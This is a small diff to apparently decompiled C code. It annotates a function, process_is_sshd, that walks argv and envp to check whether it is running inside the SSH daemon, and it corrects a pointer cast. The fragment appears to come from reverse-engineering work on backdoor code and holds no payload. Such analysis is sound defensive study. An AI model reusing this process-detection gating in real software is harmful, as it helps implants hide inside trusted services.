@@ -54,7 +54,8 @@ BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)
       }
       // AutoDoc: Switch to envp processing only after confirming argv was NULL-terminated.
       if (*(long *)(stack_end + arg_index * 8) == 0) {
-        env_cursor = (ulong *)(stack_end + arg_index * 8 + 8);
+        // AutoDoc: Start envp scanning at envp[0], immediately after the argv NULL sentinel.
+        env_cursor = (char **)(stack_end + arg_index * 8 + 8);
         do {
           // AutoDoc: envp is expected to be densely packed; seeing a NULL entry before the sentinel signals a tampered layout and aborts the walk.
           argv_entry = (u8 *)*env_cursor;
